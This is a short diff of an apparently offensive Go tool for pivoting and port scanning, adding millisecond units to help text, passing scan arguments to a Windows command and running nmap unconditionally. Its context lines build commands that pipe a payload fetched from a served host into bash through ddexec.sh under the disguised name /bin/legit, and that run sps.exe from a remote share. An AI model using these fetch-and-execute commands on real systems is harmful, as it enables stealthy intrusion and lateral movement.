@@ -57,13 +57,13 @@ func main() {
 	flag.IntVar(&retries, "retries", 3, "The number of retries before moving to another port")
 
 	var delay_between_retries int
-	flag.IntVar(&delay_between_retries, "delay-between-retries", 500, "Time delay between each retry")
+	flag.IntVar(&delay_between_retries, "delay-between-retries", 500, "Time delay between each retry in ms")
 
 	var timeout int
-	flag.IntVar(&timeout, "timeout", 5000, "Time to wait for server response")
+	flag.IntVar(&timeout, "timeout", 5000, "Time to wait for server response in ms")
 
 	var nmap_args string
-	flag.StringVar(&nmap_args, "nmap", "no", "Arguments passed to nmap. Example: \"-A -oN nmap\"")
+	flag.StringVar(&nmap_args, "nmap", "", "Arguments passed to nmap. Example: \"-A -oN nmap\"")
 
 	flag.Parse()
 
@@ -135,7 +135,7 @@ func main() {
 		if pivot_os == "linux" {
 			command = fmt.Sprintf("curl http://%s:%s/sps.b64 | bash <(curl http://%s:%s/ddexec.sh) /bin/legit -host %s -port %s -retries %d -delay-between-retries %d -timeout %d", serve_ip, serve_port, serve_ip, serve_port, host, ports, retries, delay_between_retries, timeout)
 		} else if pivot_os == "windows" {
-			command = fmt.Sprintf("powershell.exe -command \"\\\\%s\\%s\\sps.exe\"", serve_ip, share_name)
+			command = fmt.Sprintf("powershell.exe -command \"\\\\%s\\%s\\sps.exe\" -host %s -port %s, -retries %d -delay-between-retries %d -timeout %d", serve_ip, share_name, host, ports, retries, delay_between_retries, timeout)
 		} else {
 			fmt.Println("[-] Choose linux or windows for -pivot-os")
 			return
@@ -150,9 +150,7 @@ func main() {
 		fmt.Println(string(output))
 	}
 
-	if nmap_args != "" {
-		runNmap(host, nmap_args, nmap_ports)
-	}
+	runNmap(host, nmap_args, nmap_ports)
 }
 
 func checkArgs(host string, ports string) (string, string, []int, error) {
